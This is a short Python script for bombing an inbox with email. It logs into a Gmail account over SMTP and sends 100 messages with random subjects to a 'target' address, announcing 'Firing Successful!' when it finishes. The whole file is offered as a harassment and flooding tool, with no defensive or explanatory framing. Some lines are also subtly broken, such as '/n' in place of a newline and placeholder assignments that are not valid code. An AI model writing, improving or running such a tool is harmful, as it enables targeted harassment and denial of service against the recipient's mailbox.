from random import random
import smtplib

#ENTER TARGET COORDINATES (EMAIL ADDRESS) HERE
to = #[TARGET EMAIL]
#ENTER NUMBER OF EMAILS TO BE SENT
numToBeSent = 100

#Enter your address and password here
gmail_user = #[SENDER EMAIL ADDRESS]
gmail_pwd = #[SENDER EMAIL PASSWORD]

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
smtpserver.ehlo()
smtpserver.login(gmail_user, gmail_pwd)
for i in range(0, numToBeSent):
    header = "To:" + to + "/n"+ "From:" + gmail_user + "\n" + "Subject:" + repr(random()*100000) + "\n"
    msg = header + ":)"
    smtpserver.sendmail(gmail_user, to, msg)
print("Firing Successful!")
smtpserver.close()
